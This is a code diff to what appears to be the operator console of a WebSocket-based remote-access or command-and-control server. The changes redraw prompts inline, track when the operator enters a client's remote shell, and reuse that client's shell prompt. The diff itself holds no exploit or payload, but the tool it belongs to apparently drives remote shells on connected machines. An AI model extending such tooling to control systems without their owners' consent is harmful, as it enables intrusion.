@@ -133,6 +133,8 @@ class WebSocketServer:
         self.output_lock = threading.Lock()  # Lock for thread-safe output
         self.current_input_line = ""  # Track what user is typing
         self.message_queue = queue.Queue()  # Queue for async messages (won't interrupt typing)
+        self.in_shell_mode = False  # Track if user is in shell mode on client
+        self.last_client_prompt = ""  # Store the last prompt received from client
         
         # Live view state
         self.liveview_session = None
@@ -199,8 +201,20 @@ class WebSocketServer:
         self.http_server_thread.start()
     
     def async_print(self, message, end='\n'):
-        """Thread-safe print that doesn't break current input line - queues message for display"""
-        self.message_queue.put(message)
+        """Thread-safe print that shows notification inline without breaking input"""
+        with self.output_lock:
+            # Print notification on new line, then redraw prompt
+            sys.stdout.write('\r\033[K')  # Clear current line
+            sys.stdout.write(message + end)
+            # Redraw appropriate prompt
+            if self.active_session is not None:
+                if self.in_shell_mode and self.last_client_prompt:
+                    sys.stdout.write(self.last_client_prompt)
+                else:
+                    sys.stdout.write(self.session_prompt(self.active_session))
+            else:
+                sys.stdout.write(self.server_prompt())
+            sys.stdout.flush()
     
     def flush_messages(self):
         """Print all queued messages - call this after user submits command"""
@@ -653,6 +667,12 @@ class WebSocketServer:
                     try:
                         text = data.decode('utf-8', errors='replace')
                         print(text, end='', flush=True)
+                        # Capture the last line as potential shell prompt (for clear command)
+                        lines = text.split('\n')
+                        last_line = lines[-1].strip() if lines else ''
+                        # Check if it looks like a shell prompt (ends with > or $ or #)
+                        if last_line and (last_line.endswith('>') or last_line.endswith('$') or last_line.endswith('#')):
+                            self.last_client_prompt = last_line + ' '
                     except:
                         pass
         
@@ -1978,6 +1998,8 @@ class WebSocketServer:
                     
                     if cmd.lower() in ['background', 'back', 'bg']:
                         print(f"\n[*] Backgrounding session {session_id}\n")
+                        self.in_shell_mode = False
+                        self.last_client_prompt = ''
                         break
                     
                     if cmd == '':
@@ -1996,8 +2018,13 @@ class WebSocketServer:
                     if cmd in ['clear', 'cls']:
                         self.clear_screen()
                         self.flush_messages()
-                        print(f"[*] Session {session_id} active")
-                        print(self.session_prompt(session_id), end="", flush=True)
+                        # Show appropriate prompt based on shell mode
+                        if self.in_shell_mode and self.last_client_prompt:
+                            print(f"[*] Shell session active")
+                            print(self.last_client_prompt, end="", flush=True)
+                        else:
+                            print(f"[*] Session {session_id} active")
+                            print(self.session_prompt(session_id), end="", flush=True)
                         continue
                     
                     if cmd == 'help':
@@ -2007,6 +2034,15 @@ class WebSocketServer:
                         continue
                     
                     # Send command to client
+                    # Track shell mode
+                    if cmd == 'shell':
+                        self.in_shell_mode = True
+                        self.last_client_prompt = ''
+                    elif cmd == 'exit' and self.in_shell_mode:
+                        # Could be exiting shell on client side
+                        self.in_shell_mode = False
+                        self.last_client_prompt = ''
+                    
                     if not await self.send_command(session_id, cmd):
                         print(f"\n[!] Failed to send command")
                         break
@@ -2014,13 +2050,19 @@ class WebSocketServer:
                     # Wait briefly for command response then show prompt
                     await asyncio.sleep(0.3)
                     self.flush_messages()
-                    print(self.session_prompt(session_id), end="", flush=True)
+                    # Show client prompt if in shell mode, otherwise session prompt
+                    if self.in_shell_mode and self.last_client_prompt:
+                        print(self.last_client_prompt, end="", flush=True)
+                    else:
+                        print(self.session_prompt(session_id), end="", flush=True)
                     
                 except KeyboardInterrupt:
                     print(f"\n\n[*] Backgrounding session {session_id}\n")
                     break
         finally:
             self.active_session = None
+            self.in_shell_mode = False
+            self.last_client_prompt = ''
             print(self.server_prompt(), end="", flush=True)
     
     def list_sessions(self):
